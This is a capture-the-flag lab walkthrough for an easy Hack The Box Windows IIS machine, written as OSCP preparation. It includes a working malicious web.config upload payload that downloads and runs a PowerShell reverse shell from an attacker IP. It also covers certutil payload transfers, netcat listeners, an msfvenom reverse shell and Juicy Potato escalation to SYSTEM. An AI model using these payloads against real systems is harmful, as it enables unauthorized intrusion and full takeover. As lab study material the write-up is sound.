## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP.md)
## 🧭 Reconnaissance

### ⚡ Fast Port Scan
```bash
export IP=10.10.10.93
rustscan --ulimit 5000 -a $IP -- -A -sC -oN recon/$IP.scan.rustscan.txt
```

### 📌 Result Summary:
- **Port 80** open (HTTP)
- **Service**: Microsoft IIS 7.5
- **Server OS**: Windows Server 2008 R2

---

## 🌐 [Web Enumeration](HTTP.md)

### 📁 Directory Enumeration via ShortScan
```bash
shortscan -F http://$IP/
```

### ✅ Discovered Pages:
- `/transfer.aspx` – file upload endpoint
- `/uploadedfiles/` – public directory, potentially for uploaded files

---

## 💣 Exploitation – File Upload Bypass via `web.config`

### 🔍 Goal:
Bypass file extension filtering and achieve **Remote Code Execution** (RCE).

### 🧪 Technique:
1. Used **Burp Intruder** to fuzz file extensions during upload.
2. `.config` was accepted (unexpected but powerful).

### 📝 Malicious `web.config` Payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
              scriptProcessor="%windir%\system32\inetsrv\asp.dll" 
              resourceType="Unspecified" requireAccess="Write" preCondition="bitness64"/>
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions><remove fileExtension=".config"/></fileExtensions>
            <hiddenSegments><remove segment="web.config"/></hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Set obj = CreateObject("WScript.Shell")
obj.Exec("cmd /c powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.16.72/Invoke-PowerShellTcp.ps1')")
%>
```

---

## 🛰️ Reverse Shell

### 🧪 Using Nishang:
```bash
echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.72 -Port 4444" >> Invoke-PowerShellTcp.ps1
updog -p 80  # serve payload
```

### 🧲 Listener (with rlwrap for convenience):
```bash
rlwrap -f . -r nc -nlvp 4444
```

### 🚀 Trigger Shell:
- Upload `web.config` via `/transfer.aspx`
- Visit `/uploadedfiles/web.config` to execute
- ✅ You get a reverse shell as user `merlin`

---

## 🏁 User Flag
```bash
C:\Users\merlin\Desktop> type user.txt
```

---

## 🚀 Privilege Escalation – Juicy Potato

### 📌 Key Privilege:
```bash
whoami /priv
# SeImpersonatePrivilege: Enabled ✅
```

### ⚙️ Transfer Juicy Potato:
```powershell
certutil -urlcache -split -f http://10.10.16.72/JuicyPotato.exe jp.exe
```

### 💣 Generate Reverse Shell (64-bit):
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.72 LPORT=443 -f exe -o reverse.exe
```

### 📥 Transfer payload:
```powershell
certutil -urlcache -split -f http://10.10.16.72/reverse.exe reverse.exe
```

---

## 🎯 Execute PrivEsc
```powershell
.\jp.exe -l 1337 -p reverse.exe -t *
```

Start listener:
```bash
rlwrap -f . -r nc -nlvp 443
```

### ✅ Shell as SYSTEM

---

## 🔐 Root Flag
```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## 📚 Lessons Learned

### 🔓 Initial Access:
- Exploited **file upload bypass** using `.config` file
- Abused ASP handler config to execute malicious code

### 📈 Privilege Escalation:
- Leveraged **SeImpersonatePrivilege** with Juicy Potato for SYSTEM access

### 🛡️ Mitigations:
- Harden file uploads: restrict extensions, validate contents, isolate directories
- Restrict SeImpersonatePrivilege to trusted services
- Patch critical systems (this was Windows Server 2008 R2 – unpatched!)

---

## 🎥 [VOD Replay](https://www.twitch.tv/deadpool3020/v/2346652668?sr=a&t=6s)

---

Let me know if you'd like this exported as a `.md` or turned into a downloadable report. Ready for the next target? 🧠💀